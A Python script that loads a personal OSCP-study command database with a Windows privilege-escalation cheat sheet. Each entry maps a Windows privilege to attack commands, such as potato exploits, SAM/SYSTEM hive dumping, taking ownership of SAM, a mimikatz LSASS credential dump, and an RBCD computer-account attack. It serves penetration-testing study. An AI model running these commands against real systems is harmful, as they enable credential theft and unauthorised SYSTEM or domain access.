#!/usr/bin/env python3
"""
##############################################
## Freeworld - Allergic to aluminum baby   ##
## OSCP Command DB - WINDOWS PRIVS PATCH   ##
##############################################
Windows privilege -> privesc technique mapping
Usage:
    python3 privesc_privs_patch.py
"""
import sqlite3, os
DB_PATH = os.path.expanduser("~/.oscp_commands.db")

commands = [
    {
        "tool": "whoami",
        "description": "Check all Windows privileges -- run this immediately after landing any shell",
        "command": "whoami /priv",
        "category": "enumeration",
        "tags": "windows,privesc,privileges,enumeration,whoami"
    },
    {
        "tool": "SeImpersonatePrivilege",
        "description": "SeImpersonatePrivilege -- use PrintSpoofer (Server 2019/Win10) or GodPotato (modern) or JuicyPotato (older). Service accounts almost always have this.",
        "command": "C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c cmd",
        "category": "privesc",
        "tags": "windows,privesc,SeImpersonatePrivilege,printspoofer,potato,system,service-account"
    },
    {
        "tool": "SeAssignPrimaryTokenPrivilege",
        "description": "SeAssignPrimaryTokenPrivilege -- same potato attacks as SeImpersonatePrivilege. Use PrintSpoofer or GodPotato.",
        "command": "C:\\Windows\\Temp\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"",
        "category": "privesc",
        "tags": "windows,privesc,SeAssignPrimaryTokenPrivilege,godpotato,potato,system"
    },
    {
        "tool": "SeBackupPrivilege",
        "description": "SeBackupPrivilege -- read any file regardless of ACL. Dump SAM/SYSTEM hive or read root flag directly.",
        "command": "reg save HKLM\\SAM C:\\Temp\\SAM && reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM",
        "category": "privesc",
        "tags": "windows,privesc,SeBackupPrivilege,sam,system,hive,backup"
    },
    {
        "tool": "SeBackupPrivilege",
        "description": "SeBackupPrivilege -- copy protected files using robocopy bypass",
        "command": "robocopy /b C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM",
        "category": "privesc",
        "tags": "windows,privesc,SeBackupPrivilege,robocopy,sam,system"
    },
    {
        "tool": "SeRestorePrivilege",
        "description": "SeRestorePrivilege -- write any file regardless of ACL. Overwrite binaries or drop DLLs into system paths.",
        "command": "reg restore HKLM\\SAM C:\\Temp\\SAM",
        "category": "privesc",
        "tags": "windows,privesc,SeRestorePrivilege,write,dll,hijack"
    },
    {
        "tool": "SeTakeOwnershipPrivilege",
        "description": "SeTakeOwnershipPrivilege -- take ownership of any file then read/write it. Target SAM, SYSTEM, or sensitive files.",
        "command": "takeown /f C:\\Windows\\System32\\config\\SAM && icacls C:\\Windows\\System32\\config\\SAM /grant DOMAIN\\USER:F",
        "category": "privesc",
        "tags": "windows,privesc,SeTakeOwnershipPrivilege,takeown,icacls,sam"
    },
    {
        "tool": "SeDebugPrivilege",
        "description": "SeDebugPrivilege -- debug/inject into any process including SYSTEM processes. Use mimikatz to dump LSASS.",
        "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
        "category": "privesc",
        "tags": "windows,privesc,SeDebugPrivilege,mimikatz,lsass,dump,creds"
    },
    {
        "tool": "SeLoadDriverPrivilege",
        "description": "SeLoadDriverPrivilege -- load a malicious kernel driver. Complex but gives kernel-level access.",
        "command": "# Use EoPLoadDriver -- load vulnerable signed driver then exploit for SYSTEM",
        "category": "privesc",
        "tags": "windows,privesc,SeLoadDriverPrivilege,driver,kernel"
    },
    {
        "tool": "SeManageVolumePrivilege",
        "description": "SeManageVolumePrivilege -- full C: drive control. Run SeManageVolumeExploit then DLL hijack via tzres.dll in wbem.",
        "command": "C:\\Windows\\Temp\\SeManageVolumeExploit.exe",
        "category": "privesc",
        "tags": "windows,privesc,SeManageVolumePrivilege,semanagevolume,dll-hijack,system"
    },
    {
        "tool": "SeMachineAccountPrivilege",
        "description": "SeMachineAccountPrivilege -- add computer accounts to domain. Use for RBCD attack to impersonate Administrator.",
        "command": "impacket-addcomputer DOMAIN/USER -hashes ':NTHASH' -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip DC_IP",
        "category": "privesc",
        "tags": "windows,privesc,SeMachineAccountPrivilege,rbcd,computer-account,ad"
    },
    {
        "tool": "SeCreateSymbolicLinkPrivilege",
        "description": "SeCreateSymbolicLinkPrivilege -- create symlinks to redirect file operations. Can redirect writes to privileged locations.",
        "command": "# Use symlink attacks to redirect privileged file writes",
        "category": "privesc",
        "tags": "windows,privesc,SeCreateSymbolicLinkPrivilege,symlink"
    },
    {
        "tool": "SeChangeNotifyPrivilege",
        "description": "SeChangeNotifyPrivilege -- bypass traverse checking. Enabled by default on all users -- NOT a privesc vector on its own.",
        "command": "# Not exploitable -- default privilege for all users",
        "category": "privesc",
        "tags": "windows,privesc,SeChangeNotifyPrivilege,not-exploitable,reference"
    },
    {
        "tool": "SeCreateGlobalPrivilege",
        "description": "SeCreateGlobalPrivilege -- create global objects in all sessions. Limited privesc use on its own.",
        "command": "# Limited use -- typically held by service accounts. Not directly exploitable.",
        "category": "privesc",
        "tags": "windows,privesc,SeCreateGlobalPrivilege,reference"
    },
    {
        "tool": "privesc-reference",
        "description": "Windows privilege quick reference -- key privesc privileges ranked by impact",
        "command": "# HIGH: SeImpersonate, SeAssignPrimaryToken -> Potato/PrintSpoofer -> SYSTEM | SeBackup/SeRestore -> read/write any file | SeDebug -> mimikatz LSASS dump | SeLoadDriver -> kernel exploit | SeManageVolume -> C: drive control -> DLL hijack | SeTakeOwnership -> own any file | SeMachineAccount -> RBCD -> domain admin | LOW/NO USE: SeChangeNotify, SeCreateGlobal, SeIncreaseWorkingSet, SeTimeZone, SeSystemtime",
        "category": "privesc",
        "tags": "windows,privesc,reference,privileges,cheatsheet,all"
    },
]

def run():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    added = 0
    skipped = 0
    for entry in commands:
        c.execute("SELECT id FROM commands WHERE command = ?", (entry["command"],))
        if c.fetchone():
            print(f"  [~] Skipped (exists): {entry['tool']} -- {entry['description'][:55]}")
            skipped += 1
        else:
            c.execute(
                "INSERT INTO commands (tool, description, command, category, tags) VALUES (?,?,?,?,?)",
                (entry["tool"], entry["description"], entry["command"], entry["category"], entry["tags"])
            )
            print(f"  [+] Added: {entry['tool']} -- {entry['description'][:55]}")
            added += 1
    conn.commit()
    conn.close()
    print(f"\n  Done. {added} added, {skipped} skipped.\n")

if __name__ == "__main__":
    run()
